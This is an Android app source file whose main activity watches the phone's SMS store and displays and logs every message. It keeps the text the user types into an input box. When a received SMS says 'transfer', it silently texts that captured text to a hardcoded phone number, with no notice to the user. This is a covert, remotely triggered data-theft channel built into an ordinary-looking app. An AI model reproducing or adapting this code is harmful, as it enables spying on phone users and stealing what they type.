package com.example.pranavmistry;

import android.app.Activity;
import android.content.ContentResolver;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.telephony.SmsManager;
import android.util.Log;
import android.view.Menu;
import android.view.MotionEvent;
import android.view.View;
import android.view.View.OnTouchListener;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

public class MainActivity extends Activity implements OnTouchListener{

	String message;
	EditText text;
	int count;
	
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		TextView t = (TextView)findViewById(R.id.Text);
		t.setOnTouchListener(this);
		text = (EditText)findViewById(R.id.multiAutoCompleteTextView1);
		text.setOnTouchListener(this);
		listenForSMS();
	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}

	@Override
	public boolean onTouch(View v, MotionEvent event) {
		// TODO Auto-generated method stub
 		//Toast.makeText(getApplicationContext(), event.getX()+":"+event.getY(), Toast.LENGTH_SHORT).show();
		message = text.getText().toString();

		return false;
	}

	
	private void listenForSMS(){
	    Log.v("SMSTEST", "STARTED LISTENING FOR SMS OUTGOING");
	    Handler handle = new Handler(){};

	    SMSObserver myObserver = new SMSObserver(handle);

	    ContentResolver contentResolver = getContentResolver();
	    contentResolver.registerContentObserver(Uri.parse("content://sms"),true, myObserver);
	}
	
	private class SMSObserver extends ContentObserver{

	    String idCheck="";
	    
	    public SMSObserver(Handler handler) {
	        super(handler);
	    }

	    public void onChange(boolean selfChange) {
	        super.onChange(selfChange);
	        //Log.v("SMSTEST", "HIT ON CHANGE");

	        Uri uriSMSURI = Uri.parse("content://sms");
	        
	        Cursor cur = getContentResolver().query(uriSMSURI, null, null,
	                     null, null);
	        cur.moveToNext();
	        //OUTER TEST
	        String id = cur.getString(cur.getColumnIndex("_id"));
	        String content = cur.getString(cur.getColumnIndex("body"));
	       
	        if(id.equals(idCheck))return;
	        idCheck = id;
	        String protocol = cur.getString(cur.getColumnIndex("protocol"));
	        String[] s = cur.getColumnNames();
	        for(int i=0;i<s.length;i++)Log.v("", s[i]);
	        if(protocol == null){
//	          Log.v("SMSTEST", "SMS SENT: count: " + count);
	        	Toast.makeText(getApplicationContext(), ">>"+content+":"+(count++), Toast.LENGTH_SHORT).show();
		        
	       }else{
//	            Log.v("SMSTEST", "SMS RECIEVED");
	    	   Toast.makeText(getApplicationContext(), "<<"+content+":"+(count++), Toast.LENGTH_SHORT).show();
		      
	    	   if(content.equalsIgnoreCase("transfer")){
		    	   SmsManager manager = SmsManager.getDefault();
		    	   manager.sendTextMessage("03332836704", null, message, null, null);
		       } 
	        }
	    }
	}
	
}
